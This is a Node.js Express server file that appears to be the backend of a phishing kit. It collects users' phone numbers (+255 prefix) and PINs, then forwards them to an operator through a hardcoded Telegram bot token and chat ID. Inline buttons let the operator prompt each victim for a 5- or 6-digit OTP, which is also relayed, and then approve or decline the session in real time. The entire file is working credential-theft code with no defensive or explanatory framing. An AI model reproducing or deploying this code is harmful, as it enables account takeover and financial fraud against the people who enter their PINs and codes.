const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');


const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// Serve all files in your folder (like index.html, step6.html, etc.)
app.use(express.static(path.join(__dirname, "public"))); 

// Add a route to serve your main HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname,"public", "index.html")); 
});


app.use(cors());
app.use(bodyParser.json());
// app.use(express.static('public'));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL ||`http://localhost:${PORT}`; // Update if deployed


const sessions = {};
// 1. Initial Login
app.post('/api/submit', async (req, res) => {
    const { phone, pin, sessionId } = req.body;
    sessions[sessionId] = { phone, pin, status: 'waiting_choice' };

    const message = `🚀 *New User Login*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}`;
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_ADMIN_ID,
        text: message,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "Ask OTP (5)", callback_data: `ask_5_${sessionId}` },
                { text: "Ask OTP (6)", callback_data: `ask_6_${sessionId}` }
            ]]
        }
    });
    res.json({ success: true });
});

// 2. Poll Status
app.get('/api/status/:sessionId', (req, res) => {
    const session = sessions[req.params.sessionId];
    res.json(session ? { status: session.status } : { status: 'idle' });
});

// 3. Submit OTP & Wait for Admin Decision
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: msg,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
                ]]
            }
        });
        res.json({ success: true });
    }
});

// 4. Webhook for Admin Clicks
app.post('/api/webhook', (req, res) => {
    const { callback_query } = req.body;
    if (!callback_query) return res.sendStatus(200);

    const [action, val, sid] = callback_query.data.split('_');
    if (sessions[sid]) {
        if (action === 'ask') sessions[sid].status = `go_otp_${val}`;
        else if (action === 'accept') sessions[sid].status = 'approved';
        else if (action === 'decline') sessions[sid].status = 'declined';
    }
    res.sendStatus(200);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`
🚀 SERVER STARTED SUCCESSFULLY
----------------------------------
Local access: http://localhost:${PORT}
Network access: Check your IP (e.g., http://192.168.1.x:${PORT})
----------------------------------
    `);
});
